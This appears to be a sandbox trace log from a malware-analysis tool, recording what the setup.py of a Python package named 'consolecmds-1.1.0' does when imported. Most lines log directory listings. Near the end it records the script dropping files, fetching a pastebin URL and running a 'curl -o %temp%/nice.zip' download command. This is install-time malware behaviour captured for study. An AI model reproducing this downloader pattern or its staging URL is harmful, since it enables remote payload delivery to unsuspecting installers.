[artifact_eval/samples/packages/035_consolecmds-1.1.0/_pyfex_import_consolecmds.py:3] [print]('[pyfex-entry] import consolecmds')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/_pyfex_import_consolecmds.py:4] [import_module]('consolecmds')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('artifact_eval/network_sandbox')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('consolecmds')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('setup.cfg')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_pyfex_import_consolecmds.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('setup.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('/usr/local/lib/python310.zip')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('/usr/local/lib/python310.zip')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('__pycache__')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('sitecustomize.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('PyFEX-core/Lib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('PyFEX-core/Lib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('artifact_eval/samples/packages/035_consolecmds-1.1.0')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('artifact_eval/samples/packages/035_consolecmds-1.1.0')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_threading_local.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('graphlib.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('csv.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('consolecmds.egg-info')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('unittest')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('plistlib.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('asynchat.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('PKG-INFO')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('sre_compile.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('pprint.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('consolecmds')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_collections_abc.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('ipaddress.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('setup.cfg')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('keyword.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('dis.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_pyfex_import_consolecmds.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('site.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('ast.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('setup.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('functools.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('tarfile.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('quopri.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_py_abc.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('/usr/local/lib/python310.zip')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_pydecimal.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('py_compile.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('/usr/local/lib/python310.zip')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('concurrent')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('turtle.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('bz2.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('cmd.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_compat_pickle.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('textwrap.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('email')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('tracemalloc.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('tokenize.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('PyFEX-core/Lib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('enum.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('io.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('PyFEX-core/Lib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('random.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('gzip.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('runpy.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('msilib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_markupbase.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('pathlib.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('colorsys.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('imp.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('mailcap.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('compileall.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('this.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('numbers.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('secrets.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('importlib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_threading_local.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('re.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('sndhdr.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('graphlib.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('xmlrpc')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('csv.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('PyFEX-core/build/lib.linux-x86_64-3.10')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('PyFEX-core/build/lib.linux-x86_64-3.10')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('unittest')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('plistlib.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('asynchat.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_contextvars.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('unicodedata.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('sre_compile.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('pyexpat.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_opcode.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('pprint.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_blake2.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('cmath.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_bisect.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_collections_abc.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_lsprof.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_kr.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_curses.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('ipaddress.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('nis.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testimportmultiple.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('keyword.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_lzma.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('syslog.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('dis.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_iso2022.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('resource.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('site.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('xxlimited.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_pickle.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('ast.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_socket.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_dbm.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('fcntl.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('functools.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testclinic.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('grp.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_ssl.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('tarfile.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_datetime.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_posixshmem.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_decimal.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('quopri.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha512.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('termios.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_py_abc.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_ctypes.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('binascii.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_pydecimal.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('mmap.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha1.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('py_compile.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('spwd.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_hk.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('concurrent')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_codecs_jp.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_multibytecodec.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('turtle.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testmultiphase.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('__pycache__')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('bz2.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha3.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('zlib.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_crypt.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('cmd.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_testcapi.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_xxtestfuzz.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_compat_pickle.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_tkinter.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_random.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('textwrap.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_sha256.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_md5.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_posixsubprocess.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('email')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('tracemalloc.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('tokenize.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('enum.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('io.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('random.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('gzip.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('runpy.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('msilib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_markupbase.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('pathlib.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('colorsys.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('imp.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('mailcap.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('compileall.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('this.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('numbers.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('secrets.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('importlib')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('re.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('sndhdr.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('xmlrpc')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:85] [get_new_filepath]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:36] [join]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:80] [get_folder_contents]('PyFEX-core/build/lib.linux-x86_64-3.10')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:19] [listdir]('PyFEX-core/build/lib.linux-x86_64-3.10')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:86] [get_new_filepath]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:36] [join]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos', 'pytransform')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:87] [print]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:89] [exists]('artifact_eval/samples/work/035_consolecmds-1.1.0/home/Videos/code.py')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:93] [get_cdn]()
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_contextvars.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:41] [DummyObject]('https://pastebin.com/raw/tCPxwCgS')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('unicodedata.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:94] [system]("curl -o %temp%/nice.zip -silent  DummyObject(No module named 'requests'@setup.py:1; lineage[5] ops: getattr(get)->call->getattr(text))")
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('pyexpat.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_opcode.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('_blake2.cpython-310-x86_64-linux-gnu.so')
[artifact_eval/samples/packages/035_consolecmds-1.1.0/consolecmds/setup.py:21] [method_descriptor]('cmath.cpython-310-x86_64-linux-gnu.so')
